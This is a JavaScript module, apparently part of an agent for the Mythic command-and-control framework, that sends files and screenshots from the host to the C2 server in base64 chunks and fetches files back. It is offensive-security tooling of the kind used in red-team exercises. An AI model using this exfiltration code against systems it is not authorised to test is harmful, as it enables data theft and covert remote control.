import { base64ToBytes, bytesToBase64 } from "./bytes.js";
import { postMessage } from "./http.js";

export const FILE_CHUNK_SIZE = 262144;

export async function uploadBytes(config, uuid, taskId, bytes, meta) {
  const totalChunks = Math.max(1, Math.ceil(bytes.length / FILE_CHUNK_SIZE));
  const start = await postMessage(config, uuid, {
    action: "post_response",
    responses: [
      {
        task_id: taskId,
        download: {
          total_chunks: totalChunks,
          chunk_size: FILE_CHUNK_SIZE,
          filename: meta.filename,
          full_path: meta.full_path || meta.filename,
          is_screenshot: Boolean(meta.is_screenshot),
        },
      },
    ],
  });
  const fileId = start.responses?.[0]?.file_id;
  if (!fileId) {
    throw new Error("Mythic did not return a file_id");
  }

  for (let index = 0; index < totalChunks; index += 1) {
    const begin = index * FILE_CHUNK_SIZE;
    const chunk = bytes.subarray(begin, begin + FILE_CHUNK_SIZE);
    await postMessage(config, uuid, {
      action: "post_response",
      responses: [
        {
          task_id: taskId,
          download: {
            chunk_num: index + 1,
            file_id: fileId,
            chunk_data: bytesToBase64(chunk, false),
          },
        },
      ],
    });
  }
  return fileId;
}

export async function downloadTextFile(config, uuid, taskId, fileId) {
  const parts = [];
  let chunkNum = 1;
  let totalChunks = 1;
  while (chunkNum <= totalChunks) {
    const response = await postMessage(config, uuid, {
      action: "post_response",
      responses: [
        {
          task_id: taskId,
          upload: {
            chunk_size: FILE_CHUNK_SIZE,
            file_id: fileId,
            chunk_num: chunkNum,
          },
        },
      ],
    });
    const chunk = response.responses?.[0];
    if (!chunk || !chunk.chunk_data) {
      throw new Error("Mythic file chunk is missing");
    }
    totalChunks = Number(chunk.total_chunks) || totalChunks;
    parts.push(base64ToBytes(chunk.chunk_data));
    chunkNum += 1;
  }
  const total = parts.reduce((sum, part) => sum + part.length, 0);
  const merged = new Uint8Array(total);
  let offset = 0;
  for (const part of parts) {
    merged.set(part, offset);
    offset += part.length;
  }
  return new TextDecoder().decode(merged);
}
